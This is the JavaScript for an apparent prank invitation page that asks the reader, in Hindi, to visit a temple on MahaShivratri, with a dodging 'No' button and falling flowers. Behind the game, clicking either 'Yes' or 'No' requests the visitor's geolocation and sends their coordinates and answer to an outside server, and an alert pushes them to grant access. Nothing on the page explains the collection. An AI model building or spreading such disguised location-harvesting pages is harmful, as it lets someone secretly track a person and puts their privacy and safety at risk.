    window.onload = () => {
      // Elements
      const noBtn = document.getElementById("noBtn");
      const yesBtn = document.getElementById("yesBtn");
      const text = document.getElementById("mainText");
      const topText = document.getElementById("topText");
      const bell = document.getElementById("bell");
      const flowersContainer = document.getElementById("flowers");

      // Typewriter Text
      const line1 = "Yeh Valentine Day Kya hota hai...";
      const line2 = "Kya tum mere saath MahaShivratri ke din Mandir chalogi? 🙏";
      let i = 0, j = 0;

      function typeLine1() {
        if (i < line1.length) {
          topText.innerHTML += line1.charAt(i);
          i++;
          setTimeout(typeLine1, 50);
        } else {
          setTimeout(typeLine2, 500);
        }
      }

      function typeLine2() {
        if (j < line2.length) {
          text.innerHTML += line2.charAt(j);
          j++;
          setTimeout(typeLine2, 40);
        }
      }

      // No button moves randomly
      function moveNo() {
        const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
        const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
        noBtn.style.left = x + "px";
        noBtn.style.top = y + "px";
      }

      // Flower animation
      function startFlowers() {
        for (let i = 0; i < 40; i++) {
          setTimeout(createFlower, i * 150);
        }
      }

      function createFlower() {
        const flower = document.createElement("div");
        flower.classList.add("flower");
        flower.innerHTML = "🌸";
        flower.style.left = Math.random() * window.innerWidth + "px";
        flower.style.animationDuration = (3 + Math.random() * 3) + "s";
        flowersContainer.appendChild(flower);
        setTimeout(() => flower.remove(), 6000);
      }

      // Geolocation
      function getUserLocation(status) {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                status: status
              };
              console.log("Sending location:", data);
              sendToServer(data);
            },
            (error) => {
              console.error("Error getting location:", error);
              alert("Could not get your location. Please allow location access.");
            }
          );
        } else {
          alert("Geolocation is not supported by your browser.");
        }
      }

      // Send data to backend
      function sendToServer(data) {
        fetch("https://databackend-lllj.onrender.com/send-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(data => console.log("Server Response:", data))
        .catch(err => console.log("Error:", err));
      }

      // Attach events
      noBtn.addEventListener("mouseover", moveNo);
      noBtn.addEventListener("click", () => getUserLocation("No"));

      yesBtn.addEventListener("click", () => {
        text.innerHTML = "Har Har Mahadev! 🙏<br>Chalo Mandir saath chalte hain ❤️";
        bell.play();
        startFlowers();
        getUserLocation("Yes");
      });

      // Start typing
      typeLine1();
    };